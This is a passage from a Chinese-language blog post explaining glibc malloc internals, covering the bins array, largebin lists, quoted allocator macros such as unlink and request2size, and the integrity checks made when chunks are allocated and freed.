alt="malloc"></p><h3 id="free流程"><a href="#free流程" class="headerlink" title="free流程"></a>free流程</h3><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/1678786338155.png" alt="free"></p><h2 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h2><h3 id="bins数组相关"><a href="#bins数组相关" class="headerlink" title="bins数组相关"></a>bins数组相关</h3><p>bins数组存在于malloc_state结构体中,它被定义为一个长度为254的数组,但我们都知道真正只有126个bin,及有效下标为[0,251] (多的那两个被浪费了)。</p><p>每个bins都是一个指针,在串联bin中起到了重要作用,同一个bin的fd指针和bk指针被存储在相邻位置(例如bins[0]为unsortedbin的fd指针bins[1]为unsortedbin的bk指针)。</p><p>但其实在讲解过程中我们更多提及的是bin的下标,实际上bin数组是一个更抽象的概念，它实际<strong>并不存在</strong>,但使用bin数组下标与对应各个bin的关系更为直接，因此被更多的使用。</p><p>bins下标[X]与bin下标[Y]的关系为:</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-17_203928.png" alt=""></p><p>这也就是为什么许多教程会说bin[0]和bin[127]不存在了,因为如果这样的话对应的bins下标就为-2和252,明显越界了。</p><p><strong>以上所述其实我也不是很确定，各种教程里面的要么语焉不详没头没尾，要么上下矛盾，我也只能根据源码以及一些比较靠谱的博客做出一种比较合理的解释</strong></p><p>我主要以这两个宏为根据,特别是第二个宏与我上面的公式对上了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> smallbin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4) : (((unsigned) (sz)) &gt;&gt; 3))\</span></span><br><span class="line"><span class="meta">   + SMALLBIN_CORRECTION) ##这个只是smallbin的索引计算方式,但其他bin大差不差</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bin_at(m, i) \</span></span><br><span class="line"><span class="meta">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))      \</span></span><br><span class="line"><span class="meta">             - offsetof (struct malloc_chunk, fd))</span></span><br></pre></td></tr></table></figure><h3 id="largebin的双向链表"><a href="#largebin的双向链表" class="headerlink" title="largebin的双向链表"></a>largebin的双向链表</h3><p>largebin的双向链表与smallbin和unsortedbin不同在于,一个bin存在两个双向链表</p><p>其中一个与smallbin相同通过fd与bk将属于该bin的所有chunk串联</p><p>另一个则是通过fd_nextsize和bk_nextsize这个双向链表只串联<strong>每类大小中的一个</strong>,<strong>不包括节点bin</strong>.相同大小的chunk只有第一个会被串联，其余chunk的nextsize指针依然置为0.</p><h3 id="阅读代码"><a href="#阅读代码" class="headerlink" title="阅读代码"></a>阅读代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">victim一般代表被操作chunk</span><br><span class="line"></span><br><span class="line">fwd一般代表被操作chunk的下一个chunk</span><br><span class="line"></span><br><span class="line">bck一般代表被操作chunk的上一个chunk</span><br></pre></td></tr></table></figure><h3 id="chunk分配寻找"><a href="#chunk分配寻找" class="headerlink" title="chunk分配寻找"></a>chunk分配寻找</h3><ol><li>fastbin,tcachebin均为单链表,属于LIFO,头插头取,分配chunk主要利用fd指针</li><li>unsortedbin,smallbin,largebin均为双链表,属于FIFO,头插尾取,分配chunk主要利用bk指针,largebin有点特殊,不过大致与前两者相同</li></ol><h2 id="重要宏解释"><a href="#重要宏解释" class="headerlink" title="重要宏解释"></a>重要宏解释</h2><p>看源码最让人头大的无非各种宏了(建议在vscode中阅读源码,能直接找到声明处。)这里记几个重要的宏,顺便做点解释。</p><h3 id="chunk-at-offset"><a href="#chunk-at-offset" class="headerlink" title="chunk_at_offset"></a>chunk_at_offset</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</span></span><br></pre></td></tr></table></figure><p>通过一个chunk指针和偏移得到另一个chunk</p><h3 id="retquest2size"><a href="#retquest2size" class="headerlink" title="retquest2size"></a>retquest2size</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Check if a request is so large that it would wrap around zero when</span></span><br><span class="line"><span class="comment">   padded and aligned. To simplify some other code, the bound is made</span></span><br><span class="line"><span class="comment">   low enough so that adding MINSIZE will also not wrap around zero.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                              \</span></span><br><span class="line"><span class="meta">    ((unsigned long) (req) &gt;= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))</span></span><br><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"><span class="comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> request2size(req)                                                      \</span></span><br><span class="line"><span class="meta">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span></span><br><span class="line"><span class="meta">         ? MINSIZE                                                             \</span></span><br><span class="line"><span class="meta">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">/*  Same, except also perform argument check */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> checked_request2size(req, sz)                                          \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (REQUEST_OUT_OF_RANGE(req)) &#123;                                           \</span></span><br><span class="line"><span class="meta">        __set_errno(ENOMEM);                                                   \</span></span><br><span class="line"><span class="meta">        return 0;                                                              \</span></span><br><span class="line"><span class="meta">    &#125;                                                                          \</span></span><br><span class="line"><span class="meta">    (sz) = request2size(req);</span></span><br></pre></td></tr></table></figure><p>调整栈对齐,其中第三个宏整合了前两个,<strong>第二个是重点</strong></p><p>一个细节</p><p>若申请大小零头&lt;=size_sz,则不额外分配这部分内存,而是将下一个chunk的prev_size用以存储这部分数据</p><p>若申请大小零头&gt;size_sz,则向下一个2*size_sz对齐,以求最小损耗</p><h3 id="set-head"><a href="#set-head" class="headerlink" title="set_head"></a>set_head</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Set size at head, without disturbing its use bit */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_head_size(p, s)  ((p)-&gt;mchunk_size = (((p)-&gt;mchunk_size &amp; SIZE_BITS) | (s)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set size/use field */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_head(p, s)       ((p)-&gt;mchunk_size = (s))</span></span><br></pre></td></tr></table></figure><p>给切割或合并后新出现的chunk设置头</p><h3 id="chunksize"><a href="#chunksize" class="headerlink" title="chunksize"></a>chunksize</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunksize(p) (chunksize_nomask (p) &amp; ~(SIZE_BITS))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunksize_nomask(p)         ((p)-&gt;mchunk_size)</span></span><br></pre></td></tr></table></figure><p>得到一个chunk的大小,可选是否忽略inuse位</p><h3 id="inuse"><a href="#inuse" class="headerlink" title="inuse"></a>inuse</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* extract p&#x27;s inuse bit */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> inuse(p)      \</span></span><br><span class="line"><span class="meta">  ((((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* set/clear chunk as being inuse without otherwise disturbing */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_inuse(p)      \</span></span><br><span class="line"><span class="meta">  ((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size |= PREV_INUSE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> clear_inuse(p)      \</span></span><br><span class="line"><span class="meta">  ((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size &amp;= ~(PREV_INUSE)</span></span><br></pre></td></tr></table></figure><p>分别是得到一个chunk的inuse位,设置inuse位为1,设置inuse位为0.</p><h3 id="bin-at-m-i"><a href="#bin-at-m-i" class="headerlink" title="bin_at(m,i)"></a>bin_at(m,i)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> bin_at(m, i) \</span></span><br><span class="line"><span class="meta">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))      \</span></span><br><span class="line"><span class="meta">             - offsetof (struct malloc_chunk, fd))</span></span><br></pre></td></tr></table></figure><p>其中offsetof (struct malloc_chunk, fd))是常数<strong>值为16</strong>,所需bin的表头与前两个bins数组元素被视为了一个malloc_chunk(对unsorted bin来说前两个虽然不是bins数组成员,但也可以这样做),也就是说最终的结果就是指向这个chunk的指针,且这个chunk的fd和bk刚好是这个bin的头与尾指针。</p><h3 id="first-b-与last-b"><a href="#first-b-与last-b" class="headerlink" title="first(b)与last(b)"></a>first(b)与last(b)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> first(b)     ((b)-&gt;fd)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> last(b)      ((b)-&gt;bk)</span></span><br></pre></td></tr></table></figure><p>里面的b一般就是bin_at的返回结果,于是刚好指向所需bin的头和尾。</p><h3 id="一些常数值"><a href="#一些常数值" class="headerlink" title="一些常数值"></a>一些常数值</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MINSIZE  \                <span class="comment">//32</span></span></span><br><span class="line">  (<span class="type">unsigned</span> <span class="type">long</span>)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MALLOC_ALIGNMENT (2 * SIZE_SZ &lt; __alignof__ (long double) \         <span class="comment">//16</span></span></span><br><span class="line">  ? __alignof__ (<span class="type">long</span> <span class="type">double</span>) : <span class="number">2</span> * SIZE_SZ)</span><br></pre></td></tr></table></figure><p>MINSIZE宏定义了最小的有效分配大小(32)，它是为了确保分配的内存大小能够容纳一个堆块的头部信息和有效载荷而定义的。</p><p>MALLOC_ALIGNMENT定义了堆块的对齐方式，也就是堆块的起始地址必须是MALLOC_ALIGNMENT(16)的倍数。</p><h3 id="unlink-AV-P-BK-FD"><a href="#unlink-AV-P-BK-FD" class="headerlink" title="unlink(AV, P, BK, FD)"></a>unlink(AV, P, BK, FD)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \<span class="comment">//大小检查</span></span></span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);      \</span><br><span class="line">    FD = P-&gt;fd;      \</span><br><span class="line">    BK = P-&gt;bk;      \</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))      \  <span class="comment">//链表完整性检查</span></span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);      \</span><br><span class="line">    <span class="keyword">else</span> &#123;      \</span><br><span class="line">        FD-&gt;bk = BK;      \</span><br><span class="line">        BK-&gt;fd = FD;      \</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))      \</span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;      \</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)      \</span><br><span class="line">|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);   \</span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;      \</span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)      \</span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;      \</span><br><span class="line">                <span class="keyword">else</span> &#123;      \</span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      \</span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;      \</span><br><span class="line">                  &#125;      \</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;      \</span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span><br><span class="line">              &#125;      \</span><br><span class="line">          &#125;      \</span><br><span class="line">      &#125;      \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>unlink的出现频率非常高,是一个很重要的宏</p><h4 id="在malloc"><a href="#在malloc" class="headerlink" title="在malloc"></a>在malloc</h4><ol><li>从largebin中取chunk(fastbin,smallbin,unsortedbin都不这样做)</li><li>从比请求的chunk所在的bin大的bin中取chunk</li></ol><h4 id="在free"><a href="#在free" class="headerlink" title="在free"></a>在free</h4><p>一般在free一个chunk-B时,若其前一个chunk-A或后一个chunk-C非top)处于空闲时,则会unlinkA或者C</p><p><strong>一个细节</strong>,被free的chunk定然是没有fd,bk这些指针的,它通过<strong>自己的地址</strong>与<strong>prev_size</strong>或<strong>size</strong>这两个字段的操作来得到上一个或下一个空闲chunk的地址</p><h4 id="在malloc-consolidate"><a href="#在malloc-consolidate" class="headerlink" title="在malloc_consolidate"></a>在malloc_consolidate</h4><p>合并物理相邻的低地址或高地址空闲chunk</p><h4 id="在realloc"><a href="#在realloc" class="headerlink" title="在realloc"></a>在realloc</h4><p>合并物理相邻高地址空闲 chunk</p><h3 id="index"><a href="#index" class="headerlink" title="index"></a>index</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> NBINS             128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NSMALLBINS         64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SMALLBIN_WIDTH    MALLOC_ALIGNMENT</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> in_smallbin_range(sz)  \</span></span><br><span class="line"><span class="meta">  ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> smallbin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4) : (((unsigned) (sz)) &gt;&gt; 3))\</span></span><br><span class="line"><span class="meta">   + SMALLBIN_CORRECTION)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index_32(sz)                                                \</span></span><br><span class="line"><span class="meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="string">&lt;= 38) ?  56 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span></span><br><span class="line"><span class="meta">   126)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index_32_big(sz)                                            \</span></span><br><span class="line"><span class="meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="string">&lt;= 45) ?  49 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span></span><br><span class="line"><span class="meta">   126)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// XXX It remains to be seen whether it is good to keep the widths of</span></span><br><span class="line"><span class="comment">// XXX the buckets the same or whether it should be scaled by a factor</span></span><br><span class="line"><span class="comment">// XXX of two as well.</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index_64(sz)                                                \</span></span><br><span class="line"><span class="meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="string">&lt;= 48) ?  48 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span></span><br><span class="line"><span class="meta">   126)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index(sz) \</span></span><br><span class="line"><span class="meta">  (SIZE_SZ == 8 ? largebin_index_64 (sz)                                     \</span></span><br><span class="line"><span class="meta">   : MALLOC_ALIGNMENT == 16 ? largebin_index_32_big (sz)                     \</span></span><br><span class="line"><span class="meta">   : largebin_index_32 (sz))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((in_smallbin_range (sz)) ? smallbin_index (sz) : largebin_index (sz))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* offset 2 to use otherwise unindexable first 2 bins */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> fastbin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span></span><br></pre></td></tr></table></figure><p>这一大串全是根据实际申请大小转换相应bin数组下标的宏</p><h3 id="REMOVE-FB-fb-victim-pp"><a href="#REMOVE-FB-fb-victim-pp" class="headerlink" title="REMOVE_FB(fb, victim, pp)"></a>REMOVE_FB(fb, victim, pp)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> REMOVE_FB(fb, victim, pp)\</span></span><br><span class="line"><span class="meta">  do\</span></span><br><span class="line"><span class="meta">    &#123;\</span></span><br><span class="line"><span class="meta">      victim = pp;\</span></span><br><span class="line"><span class="meta">      <span class="keyword">if</span> (victim == NULL)\</span></span><br><span class="line"><span class="meta">break;\</span></span><br><span class="line"><span class="meta">    &#125;\</span></span><br><span class="line"><span class="meta">  while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) \</span></span><br><span class="line"><span class="meta"> != victim);\</span></span><br></pre></td></tr></table></figure><p>从fastbin中删除一个chunk</p><h3 id="binmap相关"><a href="#binmap相关" class="headerlink" title="binmap相关"></a>binmap相关</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> idx2block(i)     ((i) &gt;&gt; BINMAPSHIFT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> idx2bit(i)       ((1U &lt;&lt; ((i) &amp; ((1U &lt;&lt; BINMAPSHIFT) - 1))))</span></span><br><span class="line"><span class="comment">//((1U &lt;&lt; BINMAPSHIFT) - 1)为常数31,最终得到一个0~31的数</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mark_bin(m, i)    ((m)-&gt;binmap[idx2block (i)] |= idx2bit (i))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unmark_bin(m, i)  ((m)-&gt;binmap[idx2block (i)] &amp;= ~(idx2bit (i)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> get_binmap(m, i)  ((m)-&gt;binmap[idx2block (i)] &amp; idx2bit (i))</span></span><br></pre></td></tr></table></figure><p><code>idx2block</code> 宏接受一个整数 <code>i</code>，并将其右移 <code>BINMAPSHIFT</code> 位，相当于将 <code>i</code> 除以 <code>1 &lt;&lt; BINMAPSHIFT</code>。这个值用于计算 <code>binmap</code> 数组中相应的块号。</p><p><code>idx2bit</code> 宏接受一个整数 <code>i</code>，并将其按位左移 <code>(i) &amp; ((1U &lt;&lt; BINMAPSHIFT) - 1)</code> 位，这个值相当于将 <code>i</code> 对 <code>1 &lt;&lt; BINMAPSHIFT</code> 取余。这个值用于计算 <code>binmap</code> 数组中相应块的二进制位。</p><p><code>mark_bin</code> 宏接受一个指向 <code>malloc_state</code> 结构体的指针 <code>m</code> 和一个整数 <code>i</code>，它将 <code>binmap</code> 数组中相应的块标记为非空。</p><p><code>unmark_bin</code> 宏与 <code>mark_bin</code> 宏类似，它将 <code>binmap</code> 数组中相应的块标记为空。</p><p><code>get_binmap</code> 宏接受一个指向 <code>malloc_state</code> 结构体的指针 <code>m</code> 和一个整数 <code>i</code>，它返回 <code>binmap</code> 数组中相应块的二进制位，这个值表示该块是否为空闲块。</p><h2 id="重要函数片段"><a href="#重要函数片段" class="headerlink" title="重要函数片段"></a>重要函数片段</h2><h3 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">    errout:</span><br><span class="line">      malloc_printerr (check_action, errstr, chunk2mem (victim));</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fastbin中取chunk时,判断chunk大小是否与当前fastbin大小匹配,实现是通过得到victim地大小,然后再由该大小得到真正地index,查看是否与idx相同</p><p>是Fastbin Double Free需要通过地一个验证</p><h3 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">if</span> (__builtin_expect (chunksize_nomask (chunk_at_offset (p, size))</span><br><span class="line">  &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">     &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br></pre></td></tr></table></figure><p>free过程中,用于检测要释放的chunk的nextchunk的大小是否合规,防止内存泄露或内存越界等问题.</p><p>system_mem一般为132k</p><h3 id="0x3"><a href="#0x3" class="headerlink" title="0x3"></a>0x3</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 